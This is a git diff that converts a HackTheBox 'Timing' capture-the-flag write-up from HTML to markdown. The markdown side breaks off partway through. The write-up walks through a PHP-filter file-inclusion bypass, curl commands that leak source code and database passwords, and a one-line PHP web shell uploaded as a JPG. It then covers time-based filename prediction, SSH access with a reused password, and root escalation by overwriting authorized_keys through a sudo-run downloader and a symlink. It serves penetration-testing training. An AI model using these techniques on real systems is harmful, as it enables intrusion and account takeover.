@@ -7,4 +7,594 @@ source: https://medium.com/@NicPWNs/hackthebox-timing-write-up-76c07ce2b107?sour
 tags: ["hackthebox"]
 ---
 
-<p>This is my write-up for the Timing machine on HackTheBox that just retired! Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This machine is categorized as <em>easy</em> difficulty and was retired on June 4th, 2022.</p><h2>Timing Summary</h2><figure><img alt="Timing" src="/writeups/hackthebox-timing-write-up/img-1.png"  decoding="async" width="300" height="300" loading="eager" fetchpriority="high" /></figure><h3>Target Information</h3><p><a href="https://app.hackthebox.com/machines/timing"><strong>Machine Page</strong></a><br><strong>IP Address:</strong> 10.10.11.135<br><strong>Hostname:</strong> timing.htb</p><h3>Synopsis</h3><p>A local file inclusion (LFI) vulnerability on a PHP page allows for full enumeration of the web application’s PHP code. This enumeration leads to discovery of usernames for web application logon, and additional vulnerabilities in the web application. Reverse engineering the admin user functionality and a time-based file naming convention allows for arbitrary code to be uploaded and then executed using the previous LFI vulnerability. Reverse shell is not possible due to a firewall but code execution reveals a reused password for initial SSH login. Privilege escalation is possible through an insecure custom application that can be run with sudo privileges.</p><h2>Scanning</h2><h3>Nmap</h3><p>Nmap scans find SSH open on port 22/tcp and an HTTP webserver running on port 80/tcp.</p><pre># nmap -sV -sC -p- 10.10.11.135<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-03 18:39 EDT<br>Nmap scan report for 10.10.11.135<br>Host is up (0.056s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)<br>|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)<br>|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>| http-title: Simple WebApp<br>|_Requested resource was ./login.php<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not set<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre><pre>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 31.02 seconds</pre><h3>HTTP (port 80/tcp)</h3><p>The webserver found at port 80/tcp is a very simple login page.</p><figure><img alt="A basic login page on port 80/tcp." src="/writeups/hackthebox-timing-write-up/img-2.png"  decoding="async" width="855" height="1024" loading="lazy" /><figcaption>A basic login page on port 80/tcp.</figcaption></figure><h3>Nikto</h3><p>Nikto scans don’t find much new information about the target.</p><pre># nikto --host http://10.10.11.135/         <br>- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.11.135<br>+ Target Hostname:    10.10.11.135<br>+ Target Port:        80<br>+ Start Time:         2022-05-03 18:39:48 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.29 (Ubuntu)<br>+ The anti-clickjacking X-Frame-Options header is not present.<br>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br>+ Cookie PHPSESSID created without the httponly flag<br>+ Root page / redirects to: ./login.php<br>+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br>+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &quot;127.0.1.1&quot;.<br>+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br>+ OSVDB-3233: /icons/README: Apache default file found.<br>+ /login.php: Admin login page/section found.<br>+ 7889 requests: 0 error(s) and 8 item(s) reported on remote host<br>+ End Time:           2022-05-03 18:48:10 (GMT-4) (502 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested</pre><h3>Gobuster</h3><p>Gobuster reveals a number of PHP pages for us to check out.</p><pre># gobuster dir -u http://10.10.11.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php <br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.11.135/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Extensions:              php<br>[+] Timeout:                 10s<br>===============================================================<br>2022/06/04 20:35:09 Starting gobuster in directory enumeration mode<br>===============================================================<br>/images               (Status: 301) [Size: 313] [--&gt; http://10.10.11.135/images/]<br>/index.php            (Status: 302) [Size: 0] [--&gt; ./login.php]                  <br>/login.php            (Status: 200) [Size: 5609]                                 <br>/profile.php          (Status: 302) [Size: 0] [--&gt; ./login.php]                  <br>/image.php            (Status: 200) [Size: 0]                                    <br>/header.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                  <br>/footer.php           (Status: 200) [Size: 3937]                                 <br>/upload.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                  <br>/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.135/css/]   <br>/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.135/js/]    <br>/logout.php           (Status: 302) [Size: 0] [--&gt; ./login.php]                  <br>/server-status        (Status: 403) [Size: 277]                                  <br>                                                                                 <br>===============================================================<br>2022/06/04 21:19:47 Finished<br>===============================================================</pre><h3>image.php</h3><p>image.php is the only page that does not redirect back to the login page. Perhaps there are some hidden URL parameters here?</p><figure><img alt="image.php not redirecting to login." src="/writeups/hackthebox-timing-write-up/img-3.png"  decoding="async" width="567" height="123" loading="lazy" /><figcaption>image.php not redirecting to login.</figcaption></figure><h3>Ffuf</h3><p>We can use Ffuf to scan for hidden parameters at image.php. It finds a usable parameter called img.</p><pre># ffuf -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0</pre><pre>        /&#39;___\  /&#39;___\           /&#39;___\       <br>       /\ \__/ /\ \__/  __  __  /\ \__/       <br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      <br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      <br>         \ \_\   \ \_\  \ \____/  \ \_\       <br>          \/_/    \/_/   \/___/    \/_/       </pre><pre>       v1.3.1 Kali Exclusive &lt;3<br>________________________________________________</pre><pre> :: Method           : GET<br> :: URL              : http://10.10.11.135/image.php?FUZZ=/etc/passwd<br> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200,204,301,302,307,401,403,405<br> :: Filter           : Response size: 0<br>________________________________________________</pre><pre>img                     [Status: 200, Size: 25, Words: 3, Lines: 1]<br>:: Progress: [2588/2588] :: Job [1/1] :: 736 req/sec :: Duration: [0:00:05] :: Errors: 0 ::</pre><h2>Exploit</h2><h3>Parameter</h3><p>The img parameter is smart enough to not allow basic local file inclusion (LFI) and recognizes these attempts.</p><figure><img alt="LFI protections are in place." src="/writeups/hackthebox-timing-write-up/img-4.png"  decoding="async" width="748" height="171" loading="lazy" /><figcaption>LFI protections are in place.</figcaption></figure><h3>PHP Filter</h3><p>We can try to make use of PHP filters for a basic LFI protection bypass. This is explained <a href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">here</a>. It works and we have LFI to view /etc/passwd!</p><figure><img alt="Successful LFI of /etc/passwd." src="/writeups/hackthebox-timing-write-up/img-5.png"  decoding="async" width="1024" height="271" loading="lazy" /><figcaption>Successful LFI of /etc/passwd.</figcaption></figure><h3>First Login</h3><p>Seeing the user aaron in /etc/passwd, we can try aaron as a username and password on the login page. This simple attempt worked!</p><figure><img alt="Logging in as aaron." src="/writeups/hackthebox-timing-write-up/img-6.png"  decoding="async" width="470" height="455" loading="lazy" /><figcaption>Logging in as aaron.</figcaption></figure><p>We are now logged in as aaron.</p><figure><img alt="Successfully logged in as aaron." src="/writeups/hackthebox-timing-write-up/img-7.png"  decoding="async" width="926" height="422" loading="lazy" /><figcaption>Successfully logged in as aaron.</figcaption></figure><h3>More LFI</h3><p>Even logged in as aaron, we still don&#39;t have an obvious way to achieve code execution. However, we can still make use of the LFI vulnerability to view the source code of all of the PHP pages now.</p><h3>login.php</h3><p>login.php points us to db_conn.php which might contain a password for the database.</p><pre># curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=login.php | base64 -d<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100  2764  100  2764    0     0  25005      0 --:--:-- --:--:-- --:--:-- 25127<br>&lt;?php</pre><pre>include &quot;header.php&quot;;</pre><pre>function createTimeChannel()<br>{<br>    sleep(1);<br>}</pre><pre>include &quot;db_conn.php&quot;;</pre><h3>db_conn.php</h3><p>db_conn.php reveals a password! Unfortunately, this password doesn&#39;t seem to work anywhere else that we know of and we can&#39;t access the DB.</p><pre># curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php | base64 -d<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100   124  100   124    0     0   1246      0 --:--:-- --:--:-- --:--:--  1252<br>&lt;?php<br>$pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;4_V3Ry_l0000n9_p422w0rd&#39;);</pre><h3>upload.php</h3><p>upload.php is another PHP page to check. It shows that the page admin_auth_check.php is included first and then some other operations are done for file uploads. This information will be useful later.</p><pre># curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php | base64 -d<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100  1360  100  1360    0     0  14023      0 --:--:-- --:--:-- --:--:-- 14166<br>&lt;?php<br>include(&quot;admin_auth_check.php&quot;);</pre><pre>$upload_dir = &quot;images/uploads/&quot;;</pre><pre>if (!file_exists($upload_dir)) {<br>    mkdir($upload_dir, 0777, true);<br>}</pre><pre>$file_hash = uniqid();</pre><pre>$file_name = md5(&#39;$file_hash&#39; . time()) . &#39;_&#39; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);<br>$target_file = $upload_dir . $file_name;<br>$error = &quot;&quot;;<br>$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));</pre><pre>if (isset($_POST[&quot;submit&quot;])) {<br>    $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]);<br>    if ($check === false) {<br>        $error = &quot;Invalid file&quot;;<br>    }<br>}</pre><pre>// Check if file already exists<br>if (file_exists($target_file)) {<br>    $error = &quot;Sorry, file already exists.&quot;;<br>}</pre><pre>if ($imageFileType != &quot;jpg&quot;) {<br>    $error = &quot;This extension is not allowed.&quot;;<br>}</pre><pre>if (empty($error)) {<br>    if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) {<br>        echo &quot;The file has been uploaded.&quot;;<br>    } else {<br>        echo &quot;Error: There was an error uploading your file.&quot;;<br>    }<br>} else {<br>    echo &quot;Error: &quot; . $error;<br>}<br>?&gt;</pre><h3>admin_auth_check.php</h3><p>admin_auth_check.php finally looks like the key to the next step. It suggests that our user profile must have a role parameter set to 1 in order to pass as an admin.</p><pre># curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php | base64 -d<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100   268  100   268    0     0   2627      0 --:--:-- --:--:-- --:--:--  2653<br>&lt;?php<br>include_once &quot;auth_check.php&quot;;</pre><pre>if (!isset($_SESSION[&#39;role&#39;]) || $_SESSION[&#39;role&#39;] != 1) {<br>    echo &quot;No permission to access this panel!&quot;;<br>    header(&#39;Location: ./index.php&#39;);<br>    die();<br>}<br>?&gt;</pre><h3>Set Role to Admin</h3><p>Logged in as aaron, we can edit our profile which sends a few parameters to the server about our user.</p><figure><img alt="Editing the profile of aaron." src="/writeups/hackthebox-timing-write-up/img-8.png"  decoding="async" width="1024" height="467" loading="lazy" /><figcaption>Editing the profile of aaron.</figcaption></figure><p>Let’s intercept an update to the profile in Burp Suite. We can see the parameters passed in the POST request. If we add another parameter for role=1, this should make us an admin.</p><figure><img alt="Adding role=1 to the intercepted aaron profile edit request." src="/writeups/hackthebox-timing-write-up/img-9.png"  decoding="async" width="683" height="343" loading="lazy" /><figcaption>Adding role=1 to the intercepted aaron profile edit request.</figcaption></figure><p>After forwarding the new POST request from Burp and refreshing the page, we have a new page available labeled as “Admin Panel”. This page makes use of the upload.php page we analyzed via LFI previously.</p><figure><img alt="Refreshing to see aaron is now an admin." src="/writeups/hackthebox-timing-write-up/img-10.png"  decoding="async" width="908" height="407" loading="lazy" /><figcaption>Refreshing to see aaron is now an admin.</figcaption></figure><h3>Analyzing upload.php</h3><p>The key part to analyze within upload.php is below. It requires a JPG file to be uploaded which gets saved to /images/uploads/ on the server. However, first it renames our file to an MD5 hash of &#39;$file_hash&#39; concatenated with the current time. This MD5 hash then gets concatenated with the original name of our file for upload.</p><pre>$upload_dir = &quot;images/uploads/&quot;;</pre><pre>if (!file_exists($upload_dir)) {<br>    mkdir($upload_dir, 0777, true);<br>}</pre><pre>$file_hash = uniqid();</pre><pre>$file_name = md5(&#39;$file_hash&#39; . time()) . &#39;_&#39; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);<br>$target_file = $upload_dir . $file_name;<br>$error = &quot;&quot;;<br>$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));</pre><pre>----- SNIP -----</pre><pre>if ($imageFileType != &quot;jpg&quot;) {<br>    $error = &quot;This extension is not allowed.&quot;;<br>}</pre><p>We should be able to bypass the JPG check by simply renaming our own PHP code to a JPG extension. We can then reverse engineer the time-based MD5 hashing to find the correct file name uploaded on the server to make use of our PHP code. It’s also important to note that the $file_hash variable within the MD5 function is in single quotes and therefore will be interpreted as a string, rather than its assigned value which we would not know. We&#39;ll replicate this mistake and simply pass the string to our function as well. First, we make the JPG file containing a basic PHP web shell.</p><pre># cat shell.jpg                                                                                            <br>&lt;?php system($_GET[cmd]);?&gt;</pre><p>Next, we simply upload our JPG file containing the PHP web shell. It is accepted because it has a .jpg extension. Intercept this upload in Burp too.</p><figure><img alt="Uploading PHP code as JPG file." src="/writeups/hackthebox-timing-write-up/img-11.png"  decoding="async" width="595" height="410" loading="lazy" /><figcaption>Uploading PHP code as JPG file.</figcaption></figure><p>In Burp Suite, with the intercepted request, we can make the upload again and view the raw response from the server. This response contains the timestamp from the server which we will need to replicate the MD5 function and find our file.</p><figure><img alt="Repeating the PHP/JPG file upload in Burp to see the server’s timestamp." src="/writeups/hackthebox-timing-write-up/img-12.png"  decoding="async" width="1024" height="282" loading="lazy" /><figcaption>Repeating the PHP/JPG file upload in Burp to see the server’s timestamp.</figcaption></figure><p>Taking the time from Burp response from the server, we can convert it to Epoch time to be used in PHP. Using this we can then complete the concatenation with the other string to generate the MD5 hash that will match our uploaded file.</p><pre>php &gt; echo strtotime(&quot;Sat, 04 Jun 2022 19:27:26 GMT&quot;);<br>1654370846<br>php &gt; echo md5(&#39;$file_hash&#39; . strtotime(&quot;Sat, 04 Jun 2022 19:27:26 GMT&quot;));<br>e22d7578e888915a1d5901f78f6cdca5</pre><p>Now, using this MD5 hash, the concatenated underscore and our known file name, in addition to the LFI vulnerability used before, we can execute our PHP code on the server. A simple ls command shows that it works!</p><figure><img alt="Successful code execution using our PHP code." src="/writeups/hackthebox-timing-write-up/img-13.png"  decoding="async" width="1024" height="486" loading="lazy" /><figcaption>Successful code execution using our PHP code.</figcaption></figure><h3>Reverse Shell</h3><p>After trying many different types of reverse shells in the code execution, it seems that a firewall is blocking all outbound connections. We’ll need to find another way through enumeration. After a while, I found a source-files-backup.zip file in /opt on the system.</p><figure><img alt="Finding source-files-backup.zip on the server." src="/writeups/hackthebox-timing-write-up/img-14.png"  decoding="async" width="1024" height="72" loading="lazy" /><figcaption>Finding source-files-backup.zip on the server.</figcaption></figure><p>To download this ZIP file, I copied it to the root of the webserver /var/www/html and downloaded it. Unzipping it shows a .git directory. Because this is a backup of the website, there may be some git history of some old passwords or other information in these files. Performing a git log shows commit history, and then viewing the specific commit for an update to the db_conn file shows that there is an old password!</p><pre># git log                                                   <br>commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -&gt; master)<br>Author: grumpy &lt;grumpy@localhost.com&gt;<br>Date:   Tue Jul 20 22:34:13 2021 +0000</pre><pre>    db_conn updated</pre><pre># git show 16de2698b5b122c93461298eab730d00273bd83e<br>commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -&gt; master)<br>Author: grumpy &lt;grumpy@localhost.com&gt;<br>Date:   Tue Jul 20 22:34:13 2021 +0000</pre><pre>    db_conn updated</pre><pre>diff --git a/db_conn.php b/db_conn.php<br>index f1c9217..5397ffa 100644<br>--- a/db_conn.php<br>+++ b/db_conn.php<br>@@ -1,2 +1,2 @@<br> &lt;?php<br>-$pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;S3cr3t_unGu3ss4bl3_p422w0Rd&#39;);<br>+$pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;4_V3Ry_l0000n9_p422w0rd&#39;);</pre><p>The other password didn’t work anywhere. Luckily in this case, the previous password of S3cr3t_unGu3ss4bl3_p422w0Rd was reused for SSH as aaron. We&#39;re in as a user and can grab the flag user.txt!</p><figure><img alt="Successful SSH login as aaron." src="/writeups/hackthebox-timing-write-up/img-15.png"  decoding="async" width="644" height="454" loading="lazy" /><figcaption>Successful SSH login as aaron.</figcaption></figure><h2>Enumeration</h2><h3>Sudo</h3><p>One of the first things to always try when enumerating for privilege escalation is sudo -l. In this case it shows us that we have permissions to run a netutils executable as root.</p><pre>aaron@timing:~$ sudo -l<br>Matching Defaults entries for aaron on timing:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</pre><pre>User aaron may run the following commands on timing:<br>    (ALL) NOPASSWD: /usr/bin/netutils</pre><h3>Netutils</h3><p>Inside netutils we can see it runs a Java executable located in the root directory.</p><pre>aaron@timing:~$ cat /usr/bin/netutils<br>#! /bin/bash<br>java -jar /root/netutils.jar</pre><p>Running netutils with sudo, we can see an HTTP option that saves a remote file to aaron&#39;s home directory.</p><pre>aaron@timing:~$ sudo netutils<br>netutils v0.1<br>Select one option:<br>[0] FTP<br>[1] HTTP<br>[2] Quit<br>Input &gt;&gt; 1<br>Enter Url: http://10.10.14.4/test.txt<br>Initializing download: http://10.10.14.4/test.txt<br>File size: unavailable<br>Opening output file test.txt<br>Server unsupported, starting from scratch with one connection.<br>Starting download</pre><pre>Connection 0 finished</pre><pre>Downloaded 0 byte in 0 seconds. (0.00 KB/s)<br>```</pre><h2>Root</h2><p>There are some creative ways to take advantage of writing this file as root, but one way is to add an SSH key to the root user with a symbolic link. If we set up a symlink in aaron&#39;s home directory pointing to root&#39;s authorized_keys file, then run the netutils application and we can overwrite it as root containing our own SSH public key. First, we set up the symlink named keys.</p><pre>aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys<br>aaron@timing:~$ ls -al<br>total 36<br>drwxr-x--x 5 aaron aaron 4096 Jun  4 19:53 .<br>drwxr-xr-x 3 root  root  4096 Dec  2  2021 ..<br>lrwxrwxrwx 1 root  root     9 Oct  5  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout<br>-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc<br>drwx------ 2 aaron aaron 4096 Nov 29  2021 .cache<br>drwx------ 3 aaron aaron 4096 Nov 29  2021 .gnupg<br>lrwxrwxrwx 1 aaron aaron   26 Jun  4 19:53 keys -&gt; /root/.ssh/authorized_keys</pre><p>Now, on our attacking host, we can generate an SSH key pair, copy and stage the public key with the same name as the symlink, and host it on a webserver.</p><figure><img alt="Generating SSH key, renaming and moving it, and hosting it on a webserver." src="/writeups/hackthebox-timing-write-up/img-16.png"  decoding="async" width="547" height="598" loading="lazy" /><figcaption>Generating SSH key, renaming and moving it, and hosting it on a webserver.</figcaption></figure><p>Finally, running the netutils application and specifying our public key on our webserver to grab, it downloads it and overwrites the root user&#39;s authorized_keys file through the symbolic link. Remember, we&#39;re able to do this because we can run netutils through sudo.</p><pre>aaron@timing:~$ sudo netutils<br>netutils v0.1<br>Select one option:<br>[0] FTP<br>[1] HTTP<br>[2] Quit<br>Input &gt;&gt; 1<br>Enter Url: http://10.10.14.4/keys<br>Initializing download: http://10.10.14.4/keys<br>File size: 563 bytes<br>Opening output file keys<br>Server unsupported, starting from scratch with one connection.<br>Starting download<br>Downloaded 563 byte in 0 seconds. (2.75 KB/s)</pre><p>Now, with our public SSH key configured for root and our private key already generated and on our host, we can simply SSH to the box as root! We escalated to root and can grab the root.txt flag!</p><figure><img alt="Successful SSH login as root." src="/writeups/hackthebox-timing-write-up/img-17.png"  decoding="async" width="950" height="425" loading="lazy" /><figcaption>Successful SSH login as root.</figcaption></figure><h2>Loot</h2><p>Other than the points on HackTheBox, the lessons learned are the real treasures for this box.</p><ol><li>One issue I ran into along the way that I did not cover in the write-up was my first attempt at reversing the time-based MD5 function. I first attempted to generate the MD5 hash using Python because I am comfortable with it. However, this caused issues because the Python time function generates Epoch time with milliseconds in a different format, resulting in a different MD5. The lesson learned was to perform the reverse engineering in the same language that the original code was in (PHP) to avoid these unexpected issues.</li><li>Simple vulnerabilities/exploits used earlier in your attack chain can prove to be very useful later in the chain. In this case, we ended up using that same LFI vulnerability from the very beginning all the way to the point where we had to use it to execute our custom PHP code on the server.</li></ol><p>Thank you for reading my write-up for the Timing machine on HackTheBox. Be sure to check out my other write-ups for <a href="/notes?tag=hackthebox">HackTheBox</a>!</p>
+This is my write-up for the Timing machine on HackTheBox that just retired! Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This machine is categorized as *easy* difficulty and was retired on June 4th, 2022.
+
+## Timing Summary
+
+![Timing](/writeups/hackthebox-timing-write-up/img-1.png)
+
+### Target Information
+
+[**Machine Page**](https://app.hackthebox.com/machines/timing)  
+**IP Address:** 10.10.11.135  
+**Hostname:** timing.htb
+
+### Synopsis
+
+A local file inclusion (LFI) vulnerability on a PHP page allows for full enumeration of the web application’s PHP code. This enumeration leads to discovery of usernames for web application logon, and additional vulnerabilities in the web application. Reverse engineering the admin user functionality and a time-based file naming convention allows for arbitrary code to be uploaded and then executed using the previous LFI vulnerability. Reverse shell is not possible due to a firewall but code execution reveals a reused password for initial SSH login. Privilege escalation is possible through an insecure custom application that can be run with sudo privileges.
+
+## Scanning
+
+### Nmap
+
+Nmap scans find SSH open on port 22/tcp and an HTTP webserver running on port 80/tcp.
+
+```
+# nmap -sV -sC -p- 10.10.11.135
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-03 18:39 EDT
+Nmap scan report for 10.10.11.135
+Host is up (0.056s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
+|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
+|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-title: Simple WebApp
+|_Requested resource was ./login.php
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+```
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.02 seconds
+```
+
+### HTTP (port 80/tcp)
+
+The webserver found at port 80/tcp is a very simple login page.
+
+![A basic login page on port 80/tcp.](/writeups/hackthebox-timing-write-up/img-2.png)
+
+*A basic login page on port 80/tcp.*
+
+### Nikto
+
+Nikto scans don’t find much new information about the target.
+
+```
+# nikto --host http://10.10.11.135/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.11.135
++ Target Hostname:    10.10.11.135
++ Target Port:        80
++ Start Time:         2022-05-03 18:39:48 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie PHPSESSID created without the httponly flag
++ Root page / redirects to: ./login.php
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.php: Admin login page/section found.
++ 7889 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2022-05-03 18:48:10 (GMT-4) (502 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+### Gobuster
+
+Gobuster reveals a number of PHP pages for us to check out.
+
+```
+# gobuster dir -u http://10.10.11.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.135/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2022/06/04 20:35:09 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 313] [--> http://10.10.11.135/images/]
+/index.php            (Status: 302) [Size: 0] [--> ./login.php]
+/login.php            (Status: 200) [Size: 5609]
+/profile.php          (Status: 302) [Size: 0] [--> ./login.php]
+/image.php            (Status: 200) [Size: 0]
+/header.php           (Status: 302) [Size: 0] [--> ./login.php]
+/footer.php           (Status: 200) [Size: 3937]
+/upload.php           (Status: 302) [Size: 0] [--> ./login.php]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.11.135/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.11.135/js/]
+/logout.php           (Status: 302) [Size: 0] [--> ./login.php]
+/server-status        (Status: 403) [Size: 277]
+
+===============================================================
+2022/06/04 21:19:47 Finished
+===============================================================
+```
+
+### image.php
+
+image.php is the only page that does not redirect back to the login page. Perhaps there are some hidden URL parameters here?
+
+![image.php not redirecting to login.](/writeups/hackthebox-timing-write-up/img-3.png)
+
+*image.php not redirecting to login.*
+
+### Ffuf
+
+We can use Ffuf to scan for hidden parameters at image.php. It finds a usable parameter called img.
+
+```
+# ffuf -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
+```
+
+```
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/       
+```
+
+```
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+```
+
+```
+ :: Method           : GET
+ :: URL              : http://10.10.11.135/image.php?FUZZ=/etc/passwd
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 0
+________________________________________________
+```
+
+```
+img                     [Status: 200, Size: 25, Words: 3, Lines: 1]
+:: Progress: [2588/2588] :: Job [1/1] :: 736 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+```
+
+## Exploit
+
+### Parameter
+
+The img parameter is smart enough to not allow basic local file inclusion (LFI) and recognizes these attempts.
+
+![LFI protections are in place.](/writeups/hackthebox-timing-write-up/img-4.png)
+
+*LFI protections are in place.*
+
+### PHP Filter
+
+We can try to make use of PHP filters for a basic LFI protection bypass. This is explained [here](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/). It works and we have LFI to view /etc/passwd!
+
+![Successful LFI of /etc/passwd.](/writeups/hackthebox-timing-write-up/img-5.png)
+
